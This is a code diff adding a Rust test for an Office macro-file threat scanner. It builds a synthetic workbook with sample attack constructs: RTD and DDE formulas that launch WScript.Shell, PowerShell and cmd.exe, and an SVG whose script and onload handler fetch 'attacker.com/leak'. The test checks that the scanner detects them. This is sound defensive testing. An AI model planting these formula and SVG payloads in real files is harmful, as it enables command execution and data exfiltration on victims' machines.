@@ -3003,3 +3003,162 @@ fn e2e_drawing_actions_data_connections_and_filter_sort() {
         "JSON missing VBA-CELL-019"
     );
 }
+
+#[test]
+fn e2e_rtd_svg_and_signature_threat_inspection() {
+    let project_bytes = synthesize_cfb_project(
+        "TestProj",
+        &[("Module1", "Sub Test()\nMsgBox 1\nEnd Sub\n", &[])],
+        &[],
+    );
+
+    let content_types = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+  <Default Extension="xml" ContentType="application/xml"/>
+  <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
+  <Default Extension="svg" ContentType="image/svg+xml"/>
+  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>
+  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
+</Types>"#;
+
+    let root_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
+</Relationships>"#;
+
+    let wb_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
+  <Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
+  <Relationship Id="rId99" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProjectSignature" Target="missing_signature.bin"/>
+</Relationships>"#;
+
+    let workbook_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+  <sheets>
+    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
+  </sheets>
+  <definedNames>
+    <definedName name="MalRTD">RTD("WScript.Shell", "", "run")</definedName>
+  </definedNames>
+</workbook>"#;
+
+    let sheet1_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+  <sheetData>
+    <row r="1">
+      <c r="A1"><f>cmd</f><v>cmd</v></c>
+      <c r="B1"><f>MID(FORMULATEXT(A1), 2, 3) &amp; ".exe|'/c calc'!A0"</f></c>
+      <c r="C1"><f>RTD("WScript.Shell", "", "run", "powershell -enc AAAA")</f></c>
+    </row>
+  </sheetData>
+</worksheet>"#;
+
+    let svg_content = r#"<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <script type="text/javascript">alert(1);</script>
+  <rect width="100" height="100" onload="fetch('http://attacker.com/leak')"/>
+</svg>"#;
+
+    // Truncated / malformed signature file
+    let malformed_sig = b"INVALID_ASN1_PKCS7_TEST_HEADER";
+
+    let entries: Vec<(&str, &[u8])> = vec![
+        ("[Content_Types].xml", content_types.as_bytes()),
+        ("_rels/.rels", root_rels.as_bytes()),
+        ("xl/_rels/workbook.xml.rels", wb_rels.as_bytes()),
+        ("xl/workbook.xml", workbook_xml.as_bytes()),
+        ("xl/worksheets/sheet1.xml", sheet1_xml.as_bytes()),
+        ("xl/media/image1.svg", svg_content.as_bytes()),
+        ("xl/vbaProjectSignature.bin", malformed_sig),
+        ("xl/vbaProject.bin", &project_bytes),
+    ];
+
+    let zip_bytes = synthesize_zip(&entries);
+
+    let options = AnalysisOptions {
+        limits: Limits::default(),
+        host_profile: HostProfile::Excel,
+        ..Default::default()
+    };
+
+    let inspection = inspect_macro_file(&zip_bytes, &options).expect("Inspection should succeed");
+    let threats = &inspection.extracted.cell_threats;
+
+    // 1. Verify RealTimeData (VBA-CELL-020) for defined name MalRTD and cell C1
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "RealTimeData" && t.cell_ref == "MalRTD"),
+        "Should detect RTD in defined name MalRTD: {threats:?}"
+    );
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "RealTimeData" && t.cell_ref == "C1"),
+        "Should detect RTD formula in cell C1: {threats:?}"
+    );
+
+    // 2. Verify SuspiciousSvgVector (VBA-CELL-021) for embedded SVG with script and event handler
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "SuspiciousSvgVector"
+                && t.coordinate == "part:xl/media/image1.svg"),
+        "Should detect suspicious SVG vector graphic: {threats:?}"
+    );
+
+    // 3. Verify TamperedVbaProjectSignature (VBA-CELL-022) for malformed binary and dangling rel
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "TamperedVbaProjectSignature"
+                && t.coordinate == "part:xl/vbaProjectSignature.bin"),
+        "Should detect malformed VBA project signature: {threats:?}"
+    );
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "TamperedVbaProjectSignature"
+                && t.coordinate.contains("rId99")),
+        "Should detect dangling signature relationship rId99: {threats:?}"
+    );
+
+    // 4. Verify cell B1 resolves via FORMULATEXT to dynamic DDE
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "B1"
+            && t.threat_kind == "DDE"
+            && t.description.contains("cmd.exe|'/c calc'!A0")),
+        "Cell B1 should resolve DDE through FORMULATEXT: {threats:?}"
+    );
+
+    // 5. Verify SARIF rules VBA-CELL-020, VBA-CELL-021, VBA-CELL-022
+    let sarif = inspection_to_sarif(&inspection, "file:///test/rtd_svg_sig.xlsm");
+    assert!(
+        sarif.contains("VBA-CELL-020"),
+        "SARIF must contain VBA-CELL-020 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-021"),
+        "SARIF must contain VBA-CELL-021 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-022"),
+        "SARIF must contain VBA-CELL-022 rule"
+    );
+
+    // 6. Verify JSON output contains rule_id VBA-CELL-020, VBA-CELL-021, VBA-CELL-022
+    let json = inspect_to_json(&inspection, Disclosure::IncludeSource);
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-020\""),
+        "JSON missing VBA-CELL-020"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-021\""),
+        "JSON missing VBA-CELL-021"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-022\""),
+        "JSON missing VBA-CELL-022"
+    );
+}
